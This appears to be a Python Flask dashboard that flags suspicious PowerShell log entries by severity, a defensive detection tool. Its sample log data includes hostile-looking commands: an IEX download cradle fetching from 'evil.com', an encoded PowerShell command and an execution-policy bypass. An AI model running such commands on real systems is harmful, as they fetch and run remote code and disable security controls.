import os

import pandas as pd
from flask import Flask, render_template

from detector import detect_suspicious

LOGS_CSV = "logs.csv"
SUSPICIOUS_CSV = "suspicious_logs.csv"
HIGH_RISK_CSV = "high_risk_logs.csv"

SAMPLE_LOGS = [
    {"Time": "2026-03-30 08:12:01", "User": "alice", "Message": "Get-Process"},
    {"Time": "2026-03-30 08:14:22", "User": "bob", "Message": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com')"},
    {"Time": "2026-03-30 09:03:55", "User": "admin", "Message": "powershell -encodedcommand SGVsbG8="},
    {"Time": "2026-03-30 09:05:09", "User": "eve", "Message": "Set-ExecutionPolicy Bypass -Scope Process"},
    {"Time": "2026-03-30 09:21:43", "User": "charlie", "Message": "Start-Job -ScriptBlock {Write-Host 'useless'}"},
    {"Time": "2026-03-30 10:07:12", "User": "dave", "Message": "$w = 'hidden schedule task';"},
]


def ensure_sample_logs() -> None:
    if os.path.exists(LOGS_CSV):
        return

    df = pd.DataFrame(SAMPLE_LOGS)
    df.to_csv(LOGS_CSV, index=False)
    print(f"Created sample log file: {LOGS_CSV}")


def store_suspicious(df: pd.DataFrame) -> None:
    df.to_csv(SUSPICIOUS_CSV, index=False)


def store_high_risk(df: pd.DataFrame) -> None:
    high = df[df["Severity"] == "HIGH"].copy()
    high.to_csv(HIGH_RISK_CSV, index=False)


def print_suspicious(df: pd.DataFrame) -> None:
    if df.empty:
        print("No suspicious PowerShell logs found.")
        return

    high_count = (df["Severity"] == "HIGH").sum()
    medium_count = (df["Severity"] == "MEDIUM").sum()
    low_count = (df["Severity"] == "LOW").sum()

    print("Suspicious PowerShell logs detected:")
    print(df.to_string(index=False))
    print(f"Total suspicious logs: {len(df)}")
    print(f"High: {high_count}, Medium: {medium_count}, Low: {low_count}")

    if high_count > 0:
        print("⚠️ HIGH RISK ACTIVITY DETECTED")


app = Flask(__name__, template_folder="templates")


@app.route("/")
def index():
    total_logs = 0
    try:
        if os.path.exists(LOGS_CSV):
            total_logs = len(pd.read_csv(LOGS_CSV))
    except Exception:
        total_logs = 0

    if os.path.exists(SUSPICIOUS_CSV):
        suspicious_df = pd.read_csv(SUSPICIOUS_CSV)
    else:
        suspicious_df = detect_suspicious(LOGS_CSV)

    if "Severity" not in suspicious_df.columns:
        suspicious_df = detect_suspicious(LOGS_CSV)

    suspicious_df["Severity"] = suspicious_df["Severity"].fillna("")
    counts = suspicious_df["Severity"].value_counts().to_dict()

    logs = suspicious_df.to_dict(orient="records")
    return render_template(
        "index.html",
        total_logs=total_logs,
        suspicious_count=len(suspicious_df),
        high_count=int(counts.get("HIGH", 0)),
        medium_count=int(counts.get("MEDIUM", 0)),
        low_count=int(counts.get("LOW", 0)),
        logs=logs,
    )


if __name__ == "__main__":
    ensure_sample_logs()

    try:
        suspicious_df = detect_suspicious(LOGS_CSV)
    except FileNotFoundError as err:
        print(f"Missing logs file: {err}")
        suspicious_df = pd.DataFrame(columns=["Time", "User", "Message", "Severity", "RiskScore"])
    except Exception as err:
        print(f"Error reading logs: {err}")
        suspicious_df = pd.DataFrame(columns=["Time", "User", "Message", "Severity", "RiskScore"])

    if suspicious_df.empty:
        print("No suspicious events found in logs or missing content.")

    store_suspicious(suspicious_df)
    store_high_risk(suspicious_df)
    print_suspicious(suspicious_df)

    print("Starting web dashboard at http://127.0.0.1:5000")
    app.run(host="127.0.0.1", port=5000)

